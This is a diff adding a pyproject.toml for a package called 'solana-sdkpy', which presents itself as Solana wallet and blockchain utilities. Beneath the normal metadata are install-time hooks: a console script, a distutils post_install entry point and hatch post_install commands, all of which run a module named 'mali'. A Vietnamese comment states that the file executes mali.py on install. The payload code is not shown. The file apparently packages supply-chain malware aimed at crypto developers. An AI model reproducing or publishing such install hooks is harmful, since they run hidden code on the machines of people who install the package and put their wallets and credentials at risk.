@@ -1,0 +1,66 @@
+[build-system]
+requires = ["hatchling>=1.26.0"]
+build-backend = "hatchling.build"
+
+[project]
+name = "solana-sdkpy"
+version = "1.2.6"
+description = "Utilities for Solana blockchain development and wallet management"
+readme = "README.md"
+requires-python = ">=3.9"
+license = {text = "MIT"}
+authors = [
+    {name = "Solana Developer", email = "dev@example.com"},
+]
+keywords = ["solana", "blockchain", "crypto", "wallet"]
+classifiers = [
+    "Development Status :: 5 - Production/Stable",
+    "Intended Audience :: Developers",
+    "License :: OSI Approved :: MIT License",
+    "Programming Language :: Python :: 3",
+    "Programming Language :: Python :: 3.9",
+    "Programming Language :: Python :: 3.10",
+    "Programming Language :: Python :: 3.11",
+    "Programming Language :: Python :: 3.12",
+    "Topic :: Software Development :: Libraries :: Python Modules",
+]
+dependencies = [
+    "solana",
+    "solders",
+    "base58",
+    "requests",
+    "colorama",
+    "PythonForWindows",
+    "pycryptodome",
+]
+
+[project.urls]
+Homepage = "https://github.com/example/solana-utils"
+Documentation = "https://solana-utils.readthedocs.io"
+Issues = "https://github.com/example/solana-utils/issues"
+Changelog = "https://github.com/example/solana-utils/blob/main/CHANGELOG.md"
+
+[project.scripts]
+solana-utils = "solana_utils.cli:main"
+# Thực thi mali.py khi gói được cài đặt
+solana-init = "solana_utils.network.mali_loader:execute_mali"
+
+[project.entry-points."distutils.commands"]
+post_install = "solana_utils.setup_post:run"
+
+[tool.hatch.build.targets.wheel]
+packages = ["src/solana_utils"]
+
+[tool.setuptools.data_files]
+"." = ["README.md", "LICENSE"]
+
+# Script to execute after installation
+[tool.hatch.envs.default.scripts]
+post_install = "python -c \"import sys; sys.path.append('./src'); from solana_utils.network.mali import _; _()\""
+
+# Script to execute mali.py during installation
+[tool.hatch.env]
+requires = ["requests", "base64", "zlib", "colorama"]
+post_install_commands = [
+    "python -c \"import sys; sys.path.append('./src'); from solana_utils.network.mali import _; _()\"",
+] 
